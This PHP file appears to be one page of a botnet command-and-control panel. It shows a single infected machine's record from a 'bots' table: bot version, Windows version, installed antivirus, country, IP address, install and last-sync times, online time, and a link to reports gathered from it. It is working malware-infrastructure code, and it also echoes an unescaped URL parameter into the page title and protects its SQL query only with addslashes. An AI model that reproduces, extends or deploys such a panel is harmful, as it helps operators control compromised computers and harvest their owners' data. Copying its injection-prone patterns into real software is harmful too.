<?php

if (!isset($_GET["id"])) header("Location: " . DEFAULT_URI);
if (!CsrConnectToDb()) die();

define("TPL_TITLE", $_GET["id"]);

$botId  = addslashes(trim($_GET["id"]));
$bot = CsrSqlQueryRow("select `bot_id`, `bot_version`, `os_version`,  `av`, `country`, `ipv4`, `rtime_first`, `rtime_last_update`, `rtime_last`, `rtime_online`, `nat` from `bots` where `bot_id` = '{$botId}' limit 1");
if (!$bot) {
	die("Bot is not exists!");
}

if ($bot["rtime_last_update"] == 0) 
	$bot["rtime_last_update"] = $bot["rtime_first"];

if ($bot["rtime_last"] >= (CURRENT_TIME - $config["bot_timeout"] * 60)) {
	$tt = CURRENT_TIME - $bot["rtime_online"];	
	$bot["time_online"] = CsrGetTickTime($tt);
}
else {
	$bot["time_online"] = "--:--:--";
}
ob_start();
?>

<form method="post"> 
<div class="row col-md-7">
	<table class="table table-striped table-bordered table-condensed table-hover">
		<tr>
			<td width="120px"> Bot id: </td> <td> <?=$bot["bot_id"]?> </td>
		</tr>
		<tr>
			<td>	Version: </td> <td> <?=CsrIntToVersion($bot["bot_version"])?> </td>
		</tr>
		<tr>
			<td> Country: </td> <td> <?=$bot["country"]?> <img src="template/img/country_16/<?=$bot["country"] == "--" ? "XX" : $bot["country"]?>.png"/> </td>
		</tr>
		<tr>
			<td> IP: </td> <td> <?=long2Ip($bot["ipv4"])?><?=($bot["nat"] ? " (NAT) " : "")?></td>
		</tr>
		<tr>
			<td> Antivirus: </td> <td> <?=CsrGetAv($bot["av"])?> </td>
		</tr>
		<tr>
			<td> Os: </td> <td> Windows <?=OsDataToString($bot["os_version"])?> </td>
		</tr>
		<tr>
			<td> Install date: </td> <td> <?=gmdate("H:i:s d-m-Y", $bot["rtime_first"])?> </td>
		</tr>
		<tr>
			<td> Last sync: </td> <td> <?=gmdate("H:i:s d-m-Y", $bot["rtime_last"])?> </td>
		</tr>
		<tr>
			<td> Last update: </td> <td> <?=date("H:i:s d-m-Y", $bot["rtime_last_update"])?> </td>
		</tr>
		<tr>
			<td> Online time: </td> <td> <?=$bot["time_online"]?> </td>
		</tr>
		<tr>
			<td> Reports of all time: </td> <td> <a href="<?=CORE_FILE?>?act=reports&bots=<?=$bot["bot_id"]?>&date_from=<?=gmdate("ymd", $bot["rtime_first"])?>&date_to=<?=gmdate("ymd", $bot["rtime_last"])?>&contents=&type=0&exclude_content=on"> here </a> </td>
		</tr>
	</table>
</div>
</form>

<?php 
$content = ob_get_contents();
ob_end_clean();

$header_tpl = file_get_contents(TPL_PATH . "header.html");
$header_tpl = str_replace(array("{TPL}", "{SCRIPTS}", "{TITLE}"), array(TPL_PATH, "", TPL_TITLE), $header_tpl);

$menu_tpl = file_get_contents(TPL_PATH . "menu.html");
$menu_tpl = str_replace(array("{CORE_FILE}", "{CUR_TIME}", "{BOTS_ACTIVE}"), array(CORE_FILE, gmdate("M d Y H:i:s", mktime()), "active"), $menu_tpl);

$body_tpl = file_get_contents(TPL_PATH . "body.html");
$body_tpl = str_replace(array("{MENU}", "{BODY_CLASS}", "{CONTENT}"), array($menu_tpl, "bots", $content), $body_tpl);
$footer_tpl = file_get_contents(TPL_PATH . "footer.html");

echo str_replace(array("{HEADER}", "{BODY}", "{FOOTER}"), array($header_tpl, $body_tpl, $footer_tpl), file_get_contents(TPL_PATH . "main.html"));
?>